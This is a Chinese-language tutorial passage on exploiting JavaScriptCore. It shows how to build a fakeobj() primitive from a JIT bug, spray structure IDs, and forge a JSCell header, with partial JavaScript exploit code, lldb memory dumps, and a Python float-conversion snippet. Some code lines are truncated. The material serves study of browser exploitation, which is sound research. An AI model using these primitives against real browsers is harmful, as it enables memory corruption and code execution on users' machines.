原文地址：
在本文中，我们将为读者介绍fakeobj()原语。该原语基于addrof()中使用的一个漏洞，攻击者可以通过它来破坏内部JavaScriptCore对象的内存空间。
## 简介
在前一篇文章中，我们介绍了如何泄露javascript对象的地址；在本文中，我们将考察是否能破坏相关的内存空间。在继续阅读介绍之前，您必须了解一下JavaScript对象在内存中的布局情况（如内部属性和butterfly结构等），因为在这篇文章中，我们将使用这些知识将内存泄漏问题转化为内存破坏问题。
读者可能好奇我们是如何实现这个转化过程的，老实说，这可比简单的缓冲区溢出的利用要复杂得多，因为这里无法直接控制指令指针。虽然我们这里的漏洞的可利用性较差，但是，经过一番适当地折腾，就能发挥出其强大的威力了。
## “fakeobj”原语
在saelo的相关[文章](http://phrack.org/papers/attacking_javascript_engines.html
"文章")中，他总共谈到了两个原语：addrof和fakeobj。在前面的文章中，我们已经见识了如何利用addrof原语来泄漏内存中对象的地址，现在让我们来看看fakeobj的威力如何。
fakeobj原语的工作机理实际上与addrof原语正好相反。这里，我们将本机双精度浮点数注入JSValues数组，以允许我们创建JSObject指针。
请记住，这篇文章中，JSValues是以下面的格式来存储的32位整数的：其最高字节为FFFF，具体如下所示。
    Pointer {  0000:PPPP:PPPP:PPPP
             / 0001:****:****:****
    Double  {         ...
             \ FFFE:****:****:****
    Integer {  FFFF:0000:IIII:IIII
这正是我们在内存中看到的存储方式，但是，当我们将一个JavaScript对象添加到数组中时，实际存储的是一个指针，即该对象的地址。所以，既然addrof原语的思路是将指向一个对象的指针作为双精度浮点型数据读取的话，那么，我们能否反过来，即将双精度浮点型数据解释为指向一个对象的指针呢？这正是我们现在要做的。
让我们复制addrof代码并进行相应的改造。
    // 
    // fakeobj primitive
    // Numbers in the comments represent the points listed below the code.
    function fakeobj(dbl) { // (1) & (2)
      var array = [13.37];
      var reg = /abc/y;
      // Target function
      var AddrSetter = function(array) { // (4)
        "abc".match(reg);
        array[0] = dbl; // (3)
      }
      // Force optimization
      for (var i = 0; i >>
为简单起见，这里将创建一个只有单个属性x的对象，实际上，这个属性就是一个简单的整数。
    >>> test = {}
    [object Object]
    >>> test.x = 1
    1
    >>> describe(test)
    Object: 0x62d0000d4080 with butterfly 0x0 (Structure 0x62d000188310: [...])
    # Hit CTRL + C
    (lldb) x/4gx 0x62d0000d4080
    0x62d0000d4080: 0x0100160000000126 0x0000000000000000
    0x62d0000d4090: 0xffff000000000001 0x0000000000000000
通过观察这个对象，我们发现0x0100160000000126具有一些标志和结构ID，它们一起组成了JSCell头部。之后，是一个由null（0x0）值组成的butterfly结构，后跟内联属性x，我们将其设置为32位整数，其值为1。现在，请记住这些特点，接下来就要开始动手伪造这样的对象了。
这个漏洞利用方法中的亮点之一是，在伪造对象时，我们可以利用这样一个事实——对象的前几个属性是内联属性，并且不会放入butterfly结构中。现在，让我们先看看这个对象在内存中的布局情况。在这里，尤其需要注意属性1、2、3：
    >>> fake = {}
    [object Object]
    >>> fake.a = 1
    1
    >>> fake.b = 2
    2
    >>> fake.c = 3
    3
    >>> describe(fake)
    Object: 0x62d0000d40c0 with butterfly 0x0 ...
    # Hit CTRL + C
    (lldb) x/6gx 0x62d0000d40c0
    0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
    0x62d0000d40d0: 0xffff000000000001 0xffff000000000002
    0x62d0000d40e0: 0xffff000000000003 0x0000000000000000
接下来，我们开始对这个原语进行测试。为此，我们可以使用addrof来获取其地址，然后，针对这个地址使用fakeobj原语。这意味着hax对象现在应该与fake对象是一模一样的。
    >>> addrof(fake)
    5.36780059573753e-310
    >>> hax = fakeobj(5.36780059573753e-310)
    [object Object]
    >>> hax.a
    1
    >>> hax.b
    2
    >>> hax.c
    3
    >>> describe(hax)
    Object: 0x62d0000d40c0 with butterfly 0x0 ...
    >>> describe(fake)
    Object: 0x62d0000d40c0 with butterfly 0x0 ...
太棒了，这样我们就能获得fake对象的地址了，继而可以使用fakeobj原语取回fake对象。这就是关键所在：我们可以完全控制JavaScript引擎，让它把双精度浮点型数据解释为指针。这就意味着，如果我们将这个双精度浮点数（即fake对象）加上一个比较小的值（+0x10），那么这个指针就会随之移动，并指向后面的内存位置。
如果我们现在使用fakeobj函数，JavaScript会认为新的偏移量是JavaScript对象，但在我们的例子中，它看起来不像是一个有效的JavaScript对象，因为它缺少标志、butterfly结构和内部属性。由于我们已经可以控制内部属性，所以可以尝试创建一个有效的Javascript对象。
下面，让我们从标志和结构ID开始。如您所知，结构ID定义了对象中存在哪些属性。如果我们想用前面的属性x来伪造测试对象，则需要使用测试对象中的结构ID。
我们的test对象如下所示：
    # Flags and Structure ID | Butterfly
    0x0100160000000126 0x0000000000000000
    0xffff000000000001 0x0000000000000000
    # Inline property `x` with the value `1`
因此，我们希望将与真实的结构ID匹配的假结构ID写入第一个属性。不过，这里并没有类似浏览器中describe这样的函数，那么，我们如何在运行时读取test对象的结构ID呢？好吧，前面已经说过，每次向对象添加新属性时，我们都可以创建一个新结构并获得一个新的结构ID。因此，我们可以这一点来猜测有效的结构ID。
我们可以创建许多含有属性x的测试对象，同时，还可以通过添加其他属性来强制对象生成新的结构ID。基本上，我们就是对测试对象进行“喷射”操作。
    for (var i=0; i>> describe(test)
    Object: 0x62d00089d300 with butterfly 0x0 (Structure ...:[Object, {x:0, prop_4095:1} ...])
如果我们查看最后生成的test对象，我们会发现，其中不仅含有x属性，同时存在其他的属性，但重点在于这里有一个取值很大的结构ID。因此，如果我们随机选择一个结构ID，比如说0x1000，我们基本可以确定，这对应于其中的一个测试对象。从理论上讲，这也可能失败，也就是说给出的结构ID并不对应于我们的目标测试对象，但通过喷射更多的对象，我们的成功概率就会随之提高。
所以，现在我们想要构造一个64位值，即0x0100160000000126，这就是我们的特殊标志和结构ID。因为我们要进行写操作的目标是双精度浮点型数据，所以，需要先将这个64位整数转换为双精度浮点型。
    >>> # This is python, not the jsc interpreter
    >>> import struct
    >>> struct.pack("Q", 0x0100160000001000)
    b'\x00\x10\x00\x00\x00\x16\x00\x01'
    >>> struct.unpack("d", struct.pack("Q", 0x0100160000001000))
    (7.330283319472755e-304,)
现在，这个双精度浮点型数据将成为我们fake对象的有效JSCell头部，同时，我们还可以将它赋值给属性a。
    >>> // this is javascript
    >>> fake.a = 7.330283319472755e-304
    7.330283319472755e-304
    >>> describe(fake)
    Object: 0x62d0000d40c0
    // Hit CTRL + C
    (lldb) x/6gx 0x62d0000d40c0
    0x62d0000d40c0: 0x0100160000000129 0x0000000000000000